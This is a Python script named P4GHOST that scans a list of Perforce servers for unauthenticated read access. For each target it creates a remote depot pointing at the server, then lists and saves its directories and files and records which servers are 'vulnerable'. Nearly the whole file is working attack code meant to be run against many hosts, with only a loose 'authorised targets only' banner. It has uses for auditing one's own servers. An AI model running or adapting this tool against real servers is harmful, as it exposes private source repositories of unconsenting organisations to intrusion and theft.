#!/usr/bin/env python3
print(r"""
            ██▓███       ██▒   ▄████  ██░ ██  ▒█████    ██████ ▄▄▄█████▓
           ▓██░  ██▒   ██░██  ██▒ ▀█▒▓██░ ██▒▒██▒  ██▒▒██    ▒ ▓  ██▒ ▓▒
           ▓██░ ██▓▒ ▓█ ░ ██ ▒██░▄▄▄░▒██▀▀██░▒██░  ██▒░ ▓██▄   ▒ ▓██░ ▒░
           ▒██▄█▓▒ ▒▓█░   ██ ░▓█  ██▓░▓█ ░██ ▒██   ██░  ▒   ██▒░ ▓██▓ ░ 
           ▒██▒ ░  ▓▓▓████▓▓ ░▒▓███▀▒░▓█▒░██▓░ ████▓▒░▒██████▒▒  ▒██▒ ░ 
           ▒▓▒░ ░  ░▒  ▒ ▓█▓  ░▒   ▒  ▒ ░░▒░▒░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░  ▒ ░░   
           ░▒ ░     ░ ░  ▒▓▒   ░   ░  ▒ ░▒░ ░  ░ ▒ ▒░ ░ ░▒  ░ ░    ░    
           ░░       ▒  ▒ ▒ ▒░ ░   ░  ░  ░░ ░░ ░ ░ ▒  ░  ░  ░    ░      
            ░          ░           ░  ░  ░  ░    ░ ░        ░           
                                                                        
P4GHOST - Haunting misconfigured Perforce servers via unauthenticated remote depots.

This script checks if Perforce servers are vulnerable to read access via remote depots.

The is possible when the "security" level is below 4 (default), leaving the built-in 'remote' user enabled,
allowing attackers to create remote depots pointing to the target server and access its content without authentication.

Authorised targets only, bromigo. Use on your own servers or at your own risk.
==============================================================================
""")

import subprocess
import sys
import os
import re
import argparse
import socket
import time
import uuid
from dataclasses import dataclass, field
from typing import List, Dict, Tuple, Optional, Any
import datetime

timestamp = int(time.time())

# Configuration constants
CONFIG = {
    "P4_CMD": "./p4",         # Path to p4 executable
    "MY_MACHINE": "localhost", # Local hostname
    "MY_WORKING_DIR": "/tmp",  # Local working directory
    "UNICODE_PORT": "1666",    # Local Unicode p4d port
    "NON_UNICODE_PORT": "1667", # Local non-Unicode p4d port
    "REPORT_FILE": f"perforce-report-p4ghost-{timestamp}.txt",  # Output report file
    "FILE_LIST_DIR": "file_listings",  # Directory to store file listings
    "COMMAND_TIMEOUT": 200,     # Timeout for commands in seconds
}

@dataclass
class ServerResult:
    """Results from scanning a single server"""
    address: str
    hostname: str = "Unknown"
    status: str = "Unknown"
    server_info: Dict[str, str] = field(default_factory=dict)
    is_ssl: bool = False
    is_unicode: bool = False
    depot_name: str = ""
    dir_listing: Optional[str] = None
    dir_listing_success: bool = False
    file_listing_path: Optional[str] = None
    file_listing_success: bool = False
    notes: List[str] = field(default_factory=list)

class P4CommandRunner:
    """Handles running p4 commands and processing results"""
    
    @staticmethod
    def run_command(command: str, timeout=None) -> Tuple[str, str, int]:
        """
        Run a shell command and return (stdout, stderr, exit_code).
        """
        if timeout is None:
            timeout = CONFIG["COMMAND_TIMEOUT"]
            
        print(f"\n[DEBUG] Running command: {command}", flush=True)
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                encoding="utf-8",
                errors="replace",
                timeout=timeout
            )
            # Debug prints
            if result.stdout.strip():
                print("[STDOUT]:", flush=True)
                print(result.stdout, flush=True)
            if result.stderr.strip():
                print("[STDERR]:", flush=True)
                print(result.stderr, flush=True)
            return result.stdout, result.stderr, result.returncode
        except subprocess.TimeoutExpired:
            print(f"[ERROR] Command timed out after {timeout} seconds.", flush=True)
            return "", f"Command timed out after {timeout} seconds", 1
        except Exception as e:
            print(f"[ERROR] Exception running command: {e}", flush=True)
            return "", str(e), 1
            
    @staticmethod
    def run_critical_command(command: str) -> Tuple[str, str, int]:
        """
        A wrapper for run_command() that retries once if we get a timeout.
        If we time out again, we return a special exit_code 999 (meaning "double timeout").
        """
        stdout, stderr, exit_code = P4CommandRunner.run_command(command)

        if "Command timed out" in stderr:
            # Retry once
            print("[INFO] Retrying command after first timeout...", flush=True)
            stdout, stderr, exit_code = P4CommandRunner.run_command(command)
            if "Command timed out" in stderr:
                print("[ERROR] Command timed out twice. Bailing out.", flush=True)
                # Use a unique exit_code to indicate double-timeout
                return stdout, stderr, 999

        return stdout, stderr, exit_code
    
    @staticmethod
    def p4_trust_ssl(address: str) -> bool:
        """
        Establish trust with SSL-enabled server.
        Returns True if successful, False otherwise.
        """
        trust_cmd = (f"{CONFIG['P4_CMD']} -H {CONFIG['MY_MACHINE']} -d {CONFIG['MY_WORKING_DIR']} "
                    f"-p ssl:{address} -u super trust -y")
        stdout, stderr, code = P4CommandRunner.run_command(trust_cmd)
        
        # Check if trust was successful
        if code == 0 or "Added trust" in stdout or "Added trust" in stderr:
            print(f"[INFO] Successfully established trust with SSL server {address}", flush=True)
            return True
        else:
            print(f"[WARNING] Failed to establish trust with SSL server {address}", flush=True)
            return False
        
    @staticmethod
    def p4_info_command(address: str, use_ssl=False) -> Tuple[str, str, int]:
        """Run p4 info on target server with timeout and retry"""
        prefix = "ssl:" if use_ssl else ""
        full_cmd = (f"{CONFIG['P4_CMD']} -H {CONFIG['MY_MACHINE']} -d {CONFIG['MY_WORKING_DIR']} "
                   f"-p {prefix}{address} -u super info")
        return P4CommandRunner.run_critical_command(full_cmd)
    
    @staticmethod
    def p4_create_depot(depot_name: str, target_address: str, use_ssl=False, use_unicode=False) -> Tuple[str, str, int]:
        """Create a remote depot pointing to target server"""
        prefix = "ssl:" if use_ssl else ""
        
        # Generate depot specification
        spec = (
            f"Depot: {depot_name}\n"
            f"Type: remote\n"
            f"Address: {prefix}{target_address}\n"
            f"Map: //...\n"
        )
        
        # Write spec to a temporary file
        temp_file = f"/tmp/depot_spec_{uuid.uuid4().hex}.txt"
        with open(temp_file, "w") as f:
            f.write(spec)
        
        # Select the appropriate local port based on Unicode requirement
        local_port = CONFIG["UNICODE_PORT"] if use_unicode else CONFIG["NON_UNICODE_PORT"]
        unicode_flag = "-C utf8" if use_unicode else ""
        
        # Create depot using the spec file
        cmd = (f"{CONFIG['P4_CMD']} {unicode_flag} -H {CONFIG['MY_MACHINE']} -d {CONFIG['MY_WORKING_DIR']} "
              f"-p {CONFIG['MY_MACHINE']}:{local_port} -u super depot -i < {temp_file}")
        
        result = P4CommandRunner.run_command(cmd)
        
        # Don't delete the depot spec file
        return result
    
    @staticmethod
    def p4_list_dirs(depot_name: str, use_unicode=False) -> Tuple[str, str, int]:
        """List directories in the remote depot"""
        unicode_flag = "-C utf8" if use_unicode else ""
        local_port = CONFIG["UNICODE_PORT"] if use_unicode else CONFIG["NON_UNICODE_PORT"]
        
        cmd = (f"{CONFIG['P4_CMD']} {unicode_flag} -H {CONFIG['MY_MACHINE']} -d {CONFIG['MY_WORKING_DIR']} "
              f"-p {CONFIG['MY_MACHINE']}:{local_port} -u super dirs //{depot_name}/*")
        return P4CommandRunner.run_command(cmd)
    
    @staticmethod
    def p4_list_files(depot_name: str, output_file: str, use_unicode=False) -> Tuple[str, str, int]:
        """List files in the remote depot and save to a file"""
        unicode_flag = "-C utf8" if use_unicode else ""
        local_port = CONFIG["UNICODE_PORT"] if use_unicode else CONFIG["NON_UNICODE_PORT"]
        
        cmd = (f"{CONFIG['P4_CMD']} {unicode_flag} -H {CONFIG['MY_MACHINE']} -d {CONFIG['MY_WORKING_DIR']} "
              f"-p {CONFIG['MY_MACHINE']}:{local_port} -u super files //{depot_name}/... > {output_file}")
        return P4CommandRunner.run_command(cmd)
    
    @staticmethod
    def p4_delete_depot(depot_name: str, use_unicode=False) -> Tuple[str, str, int]:
        """Delete the remote depot"""
        unicode_flag = "-C utf8" if use_unicode else ""
        local_port = CONFIG["UNICODE_PORT"] if use_unicode else CONFIG["NON_UNICODE_PORT"]
        
        cmd = (f"{CONFIG['P4_CMD']} {unicode_flag} -H {CONFIG['MY_MACHINE']} -d {CONFIG['MY_WORKING_DIR']} "
              f"-p {CONFIG['MY_MACHINE']}:{local_port} -u super depot -d {depot_name}")
        return P4CommandRunner.run_command(cmd)


class P4ResponseParser:
    """Parses responses from P4 commands"""
    
    @staticmethod
    def parse_server_info(output: str) -> Dict[str, str]:
        """Parse p4 info output to extract server information"""
        info = {}
        for line in output.splitlines():
            if ":" in line:
                key, value = line.split(":", 1)
                info[key.strip()] = value.strip()
        return info
    
    @staticmethod
    def is_unicode_server(output: str, error: str) -> bool:
        """Determine if server is Unicode enabled based on output/error"""
        combined = output + error
        return "Unicode server" in combined
    
    @staticmethod
    def check_unicode_error(output: str, error: str) -> bool:
        """Check if there was a Unicode-related error"""
        combined = output + error
        return ("Unicode server permits only unicode enabled clients" in combined or
                "Unicode clients require a unicode enabled server" in combined)


class P4RemoteDepotScanner:
    """Core security scanning functionality for remote depot vulnerabilities"""
    
    def __init__(self, skip_no_license=False):
        """Initialize scanner with options"""
        self.cmd_runner = P4CommandRunner()
        self.parser = P4ResponseParser()
        self.skip_no_license = skip_no_license
        
        # Ensure file listing directory exists
        if not os.path.exists(CONFIG["FILE_LIST_DIR"]):
            os.makedirs(CONFIG["FILE_LIST_DIR"])
    
    def generate_depot_name(self, address: str) -> str:
        """Generate a valid and unique depot name based on server address"""
        # Replace ':' with '_' and ensure no other invalid chars
        base_name = address.replace(":", "_").replace(".", "_")
        # Add timestamp to ensure uniqueness
        timestamp = int(time.time())
        return f"remote_{base_name}_{timestamp}"
    
    def resolve_hostname(self, ip: str) -> str:
        """Get the hostname for an IP via reverse DNS lookup."""
        try:
            return socket.gethostbyaddr(ip)[0]
        except (socket.herror, socket.gaierror):
            return "Unknown Host"
    
    def check_server_info(self, address: str) -> Tuple[Dict[str, str], bool, bool]:
        """
        Check basic server info, determine if SSL is required and if server is Unicode.
        Returns (server_info, is_ssl, is_unicode)
        """
        # First try without SSL
        stdout, stderr, code = self.cmd_runner.p4_info_command(address)
        
        # Check for SSL requirement
        ssl_message = "Failed client connect, server using SSL."
        if (code != 0 and ssl_message in stderr) or "SSL required" in (stdout + stderr):
            print(f"[INFO] Server requires SSL, establishing trust and retrying...", flush=True)
            
            # Establish trust first
            trust_success = self.cmd_runner.p4_trust_ssl(address)
            
            # Now try p4 info with SSL
            ssl_stdout, ssl_stderr, ssl_code = self.cmd_runner.p4_info_command(address, use_ssl=True)
            
            if ssl_code == 0:
                server_info = self.parser.parse_server_info(ssl_stdout)
                is_unicode = "unicode" in ssl_stdout.lower()
                return server_info, True, is_unicode
                
            # If still failed after trust attempt
            if not trust_success or "certificate has not been verified" in (ssl_stdout + ssl_stderr):
                print(f"[WARNING] SSL certificate issues with {address} - trust could not be established", flush=True)
        
        # Check for timeout
        if code == 999:
            print(f"[ERROR] Connection to {address} timed out twice", flush=True)
            return {}, False, False
            
        # If we got here and the original command worked, use that result
        if code == 0:
            server_info = self.parser.parse_server_info(stdout)
            is_unicode = "unicode" in stdout.lower()
            return server_info, False, is_unicode
        
        # Neither worked, return empty info
        return {}, False, False
    
    def process_server(self, address: str) -> ServerResult:
        """
        Process a single server, checking for remote depot vulnerability.
        'address' is e.g. "10.10.10.1:1666".
        """
        ip, port = address.split(":")
        hostname = self.resolve_hostname(ip)
        
        result = ServerResult(address=address, hostname=hostname)
        
        print(f"\n=== Processing: {address} ({hostname}) ===", flush=True)
        
        # 1) Check server info
        server_info, is_ssl, is_unicode = self.check_server_info(address)
        result.server_info = server_info
        result.is_ssl = is_ssl
        result.is_unicode = is_unicode
        
        # Check if we need to skip based on license
        if self.skip_no_license and server_info.get("Server license") == "none":
            result.status = "Skipped - No License"
            result.notes.append("Server skipped due to having no license")
            print(f"[INFO] Skipping {address} due to no license", flush=True)
            return result
        
        # If we couldn't connect at all
        if not server_info:
            result.status = "Error - Couldn't connect"
            result.notes.append("Could not connect to server")
            print(f"[ERROR] Could not connect to {address}", flush=True)
            return result
        
        # 2) Create remote depot pointing to target server
        depot_name = self.generate_depot_name(address)
        result.depot_name = depot_name
        
        print(f"[INFO] Creating remote depot '{depot_name}' pointing to {address}", flush=True)
        create_stdout, create_stderr, create_code = self.cmd_runner.p4_create_depot(
            depot_name, address, use_ssl=is_ssl, use_unicode=is_unicode)
        
        if create_code != 0:
            result.status = "Error - Could not create remote depot"
            result.notes.append(f"Failed to create remote depot: {create_stderr}")
            print(f"[ERROR] Failed to create remote depot for {address}", flush=True)
            return result
        
        # 3) Try to list directories
        # First try with the detected Unicode setting
        dirs_stdout, dirs_stderr, dirs_code = self.cmd_runner.p4_list_dirs(depot_name, use_unicode=is_unicode)
        
        # Check for Unicode error - if mismatch, delete old depot and recreate on correct server
        if self.parser.check_unicode_error(dirs_stdout, dirs_stderr):
            print(f"[INFO] Unicode mismatch detected. Deleting depot from current server...", flush=True)
            
            # Delete the depot from the current server
            delete_stdout, delete_stderr, delete_code = self.cmd_runner.p4_delete_depot(depot_name, use_unicode=is_unicode)
            
            if is_unicode:
                # Switch to non-Unicode mode
                print(f"[INFO] Unicode mismatch, recreating depot with non-Unicode client...", flush=True)
                result.is_unicode = False
                
                # Recreate the depot on the non-Unicode server
                create_stdout, create_stderr, create_code = self.cmd_runner.p4_create_depot(
                    depot_name, address, use_ssl=is_ssl, use_unicode=False)
                
                if create_code != 0:
                    result.status = "Error - Could not recreate remote depot after Unicode mismatch"
                    result.notes.append(f"Failed to recreate remote depot: {create_stderr}")
                    print(f"[ERROR] Failed to recreate remote depot for {address} after Unicode mismatch", flush=True)
                    return result
                
                # Try listing dirs again with non-Unicode client
                dirs_stdout, dirs_stderr, dirs_code = self.cmd_runner.p4_list_dirs(depot_name, use_unicode=False)
            else:
                # Switch to Unicode mode
                print(f"[INFO] Unicode mismatch, recreating depot with Unicode client...", flush=True)
                result.is_unicode = True
                
                # Recreate the depot on the Unicode server
                create_stdout, create_stderr, create_code = self.cmd_runner.p4_create_depot(
                    depot_name, address, use_ssl=is_ssl, use_unicode=True)
                
                if create_code != 0:
                    result.status = "Error - Could not recreate remote depot after Unicode mismatch"
                    result.notes.append(f"Failed to recreate remote depot: {create_stderr}")
                    print(f"[ERROR] Failed to recreate remote depot for {address} after Unicode mismatch", flush=True)
                    return result
                
                # Try listing dirs again with Unicode client
                dirs_stdout, dirs_stderr, dirs_code = self.cmd_runner.p4_list_dirs(depot_name, use_unicode=True)
        
        if dirs_code == 0:
            result.dir_listing = dirs_stdout
            result.dir_listing_success = True
            
            # 4) Try to list files
            file_list_path = os.path.join(CONFIG["FILE_LIST_DIR"], f"{depot_name}_files.txt")
            result.file_listing_path = file_list_path
            
            #files_code = 1
            files_stdout, files_stderr, files_code = self.cmd_runner.p4_list_files(
                depot_name, file_list_path, use_unicode=result.is_unicode)
            
            if files_code == 0:
                result.file_listing_success = True
                result.status = "Vulnerable - Remote Depot Access"
                result.notes.append("Successfully accessed remote depot without authentication")
                print(f"[WARNING] Server {address} is VULNERABLE to remote depot access!", flush=True)
            else:
                result.status = "Partially Vulnerable - Dir Listing Only"
                result.notes.append("Could list directories but not files")
                print(f"[INFO] Server {address} allows directory listing but not file listing", flush=True)
        else:
            result.status = "Secure - Remote Depot Access Blocked"
            result.notes.append("Could not access remote depot")
            print(f"[INFO] Server {address} is secure against remote depot access", flush=True)
        
        # 5) Clean up - delete the remote depot from the correct server
        self.cmd_runner.p4_delete_depot(depot_name, use_unicode=result.is_unicode)
        
        return result


class ReportGenerator:
    """Generates security reports"""
    
    def __init__(self, report_file: str):
        """Initialize the report generator with the report file path"""
        self.report_file = report_file
        
        # Initialize report file with header
        with open(self.report_file, "w") as f:
            f.write(f"Perforce Remote Depot Security Scan Report\n")
            f.write(f"Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"This report is updated as each server is processed.\n\n")
            f.write("=" * 80 + "\n\n")
    
    def append_server_result(self, result: ServerResult) -> None:
        """Append a single server result to the report file as it's processed"""
        with open(self.report_file, "a") as f:
            f.write(f"Server: {result.address} ({result.hostname})\n")
            f.write(f"Status: {result.status}\n")
            f.write(f"Unicode: {'Yes' if result.is_unicode else 'No'}\n")
            f.write(f"SSL: {'Yes' if result.is_ssl else 'No'}\n")
            
            # Server info
            if result.server_info:
                f.write("\nServer Information:\n")
                for key, value in result.server_info.items():
                    f.write(f"  {key}: {value}\n")
            
            # Notes
            if result.notes:
                f.write("\nNotes:\n")
                for note in result.notes:
                    f.write(f"  - {note}\n")
            
            # Directory listing
            if result.dir_listing:
                f.write("\nDirectory Listing:\n")
                f.write(result.dir_listing)
                f.write("\n")
            
            # File listing
            if result.file_listing_path and result.file_listing_success:
                f.write(f"\nFile Listing: Saved to {result.file_listing_path}\n")
            
            f.write("\n" + "-" * 80 + "\n\n")
            f.flush()  # Ensure the data is written to disk immediately
    
    def write_summary(self, results: List[ServerResult]) -> None:
        """Write a summary at the end of the report"""
        # Calculate statistics
        vulnerable_count = sum(1 for res in results if "Vulnerable" in res.status)
        secure_count = sum(1 for res in results if "Secure" in res.status)
        error_count = sum(1 for res in results if "Error" in res.status)
        skipped_count = sum(1 for res in results if "Skipped" in res.status)
        
        with open(self.report_file, "a") as f:
            f.write("\n\nFinal Summary:\n")
            f.write("-" * 80 + "\n")
            
            # Write one-line summary for each server (similar to the format requested)
            for res in results:
                # Get the primary note (first one if multiple exist)
                note = res.notes[0] if res.notes else ""
                f.write(f"Server: {res.address} - {res.status}")
                if note:
                    f.write(f" - Note: {note}")
                f.write("\n")
            
            f.write("\n")
            
            # Summary table for quick reference
            f.write("Status Summary Table:\n")
            f.write("-" * 80 + "\n")
            f.write(f"{'Server Address':<20} {'Status':<30} {'Unicode':<10} {'SSL':<5} {'Hostname':<50}\n")
            f.write("-" * 80 + "\n")
            
            for res in results:
                f.write(f"{res.address:<20} {res.status:<30} {'Yes' if res.is_unicode else 'No':<10} "
                       f"{'Yes' if res.is_ssl else 'No':<5} {res.hostname[:25]:<25}\n")
            
            # Overall statistics
            f.write("\nStatistics:\n")
            f.write(f"Total servers scanned: {len(results)}\n")
            f.write(f"Vulnerable servers: {vulnerable_count}\n")
            f.write(f"Secure servers: {secure_count}\n")
            f.write(f"Error/unreachable: {error_count}\n")
            f.write(f"Skipped: {skipped_count}\n")
            f.write("\nScan completed at: {}\n".format(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
            f.flush()  # Ensure the data is written to disk immediately


def parse_arguments() -> argparse.Namespace:
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(description="Perforce Remote Depot Security Scanner")
    parser.add_argument("input_file", help="File containing server addresses in format 'ip:port'")
    parser.add_argument("-skipnolicense", action="store_true", 
                      help="Skip servers with 'Server license: none'")
    parser.add_argument("-report", type=str, default=CONFIG["REPORT_FILE"],
                      help=f"Output report file (default: {CONFIG['REPORT_FILE']})")
    parser.add_argument("-p4cmd", type=str, default=CONFIG["P4_CMD"],
                      help=f"Path to p4 command (default: {CONFIG['P4_CMD']})")
    parser.add_argument("-unicodeport", type=str, default=CONFIG["UNICODE_PORT"],
                      help=f"Local Unicode p4d port (default: {CONFIG['UNICODE_PORT']})")
    parser.add_argument("-nonunicodeport", type=str, default=CONFIG["NON_UNICODE_PORT"],
                      help=f"Local non-Unicode p4d port (default: {CONFIG['NON_UNICODE_PORT']})")
    parser.add_argument("-timeout", type=int, default=CONFIG["COMMAND_TIMEOUT"],
                      help=f"Command timeout in seconds (default: {CONFIG['COMMAND_TIMEOUT']})")
    return parser.parse_args()


def main() -> None:
    """Main function"""
    # Parse command-line arguments
    args = parse_arguments()
    
    # Update config from arguments
    CONFIG["P4_CMD"] = args.p4cmd
    CONFIG["UNICODE_PORT"] = args.unicodeport
    CONFIG["NON_UNICODE_PORT"] = args.nonunicodeport
    CONFIG["REPORT_FILE"] = args.report
    CONFIG["COMMAND_TIMEOUT"] = args.timeout
    
    # Check if input file exists
    if not os.path.isfile(args.input_file):
        print(f"[ERROR] Server list file '{args.input_file}' does not exist.", flush=True)
        sys.exit(1)
    
    # Initialize scanner and report generator
    scanner = P4RemoteDepotScanner(skip_no_license=args.skipnolicense)
    report_generator = ReportGenerator(CONFIG["REPORT_FILE"])
    
    print(f"[INFO] Report will be continuously updated at {CONFIG['REPORT_FILE']}", flush=True)
    
    # Process each server in the input file
    results = []
    with open(args.input_file, "r") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
                
            try:
                # Process the server
                result = scanner.process_server(line)
                
                # Append to the report immediately
                report_generator.append_server_result(result)
                
                # Save to results list for final summary
                results.append(result)
                
                print(f"[INFO] Completed processing {line} - Report updated", flush=True)
            except Exception as e:
                print(f"[ERROR] Exception processing {line}: {e}", flush=True)
                # Create a minimal result for the error
                error_result = ServerResult(address=line)
                error_result.status = f"Error - Exception: {type(e).__name__}"
                error_result.notes.append(f"Exception: {str(e)}")
                
                # Record the error in the report
                report_generator.append_server_result(error_result)
                results.append(error_result)
    
    # Write the final summary to the report
    report_generator.write_summary(results)
    
    print(f"\n[INFO] Scan complete. Final report available at {CONFIG['REPORT_FILE']}", flush=True)
    
    # Print summary to console
    vulnerable_count = sum(1 for res in results if "Vulnerable" in res.status)
    secure_count = sum(1 for res in results if "Secure" in res.status)
    
    print("\nSummary:")
    print(f"Total servers scanned: {len(results)}")
    print(f"Vulnerable servers: {vulnerable_count}")
    print(f"Secure servers: {secure_count}")


if __name__ == "__main__":
    main()
